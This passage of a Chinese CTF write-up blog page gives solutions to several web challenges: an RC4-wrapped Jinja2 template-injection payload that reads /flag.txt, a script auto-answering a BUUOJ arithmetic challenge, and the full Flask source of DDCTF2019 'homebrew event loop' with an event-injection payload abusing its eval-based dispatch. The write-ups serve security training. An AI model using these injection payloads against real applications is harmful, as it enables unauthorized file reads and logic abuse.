box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>得到加密后的payload后传入，拿到flag。</p>
+<h2 id="GXYCTF2019-Strongest-Mind">GXYCTF2019 Strongest Mind</h2>
+<h3 id="考点-v10">考点</h3>
+<ul>
+<li>Python脚本</li>
+</ul>
+<h3 id="解题-v10">解题</h3>
+<p>注意Session的使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">a = s.get(url)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line">print(a.content)</span><br></pre></td></tr></table></figure>
+<h2 id="DDCTF2019-homebrew-event-loop">DDCTF2019 homebrew event loop</h2>
+<h3 id="考点-v11">考点</h3>
+<ul>
+<li>逻辑漏洞</li>
+<li>flask session</li>
+</ul>
+<h3 id="解题-v11">解题</h3>
+<p>详细wp：<a target="_blank" rel="noopener" href="https://blog.cindemor.com/post/ctf-web-16.html">https://blog.cindemor.com/post/ctf-web-16.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">	<span class="comment"># event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line">	<span class="comment"># haystack = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">	<span class="comment"># prefix = trigger_event%23;</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="comment"># event = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            <span class="comment"># action = trigger_event%23</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="comment"># args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                	<span class="comment"># event_handler = trigger_event#_handler</span></span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                <span class="comment"># ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;])</span></span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
+<p>进入队列的顺序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">action:buy;5</span><br><span class="line">action:get_flag;</span><br><span class="line">func:consume_point;5</span><br><span class="line">action:view;index</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
+<p>日志写入的顺序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;]</span><br><span class="line">[&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
+<p>拿到flask session后解密</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200917132800.png" alt=""></p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-08-18</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/CTF/">CTF</a>-><a class="category-link" href="/categories/CTF/Python/">Python</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/CTF/" rel="tag">#CTF</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
